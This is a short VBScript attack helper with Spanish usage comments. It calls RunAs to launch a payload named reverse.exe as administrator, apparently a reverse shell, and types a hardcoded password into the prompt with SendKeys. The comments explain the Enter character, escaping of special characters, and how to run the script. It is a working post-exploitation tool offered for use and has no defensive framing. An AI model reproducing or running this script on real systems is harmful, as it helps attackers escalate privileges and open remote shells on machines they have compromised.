set oShell = Wscript.CreateObject("WScript.Shell")
oShell.Run "RunAs /noprofile /user:administrator ""C:\ACCESSIBLE\PATH\reverse.exe"""
WScript.Sleep 100
oShell.Sendkeys "P4ssw0rd~"
Wscript.Quit 


' ~ al final del password significa ENTER
' Si el password tiene simbolos especiales, encerrar el caracter en {}
' Ejecutar: cmd> runas.vbs
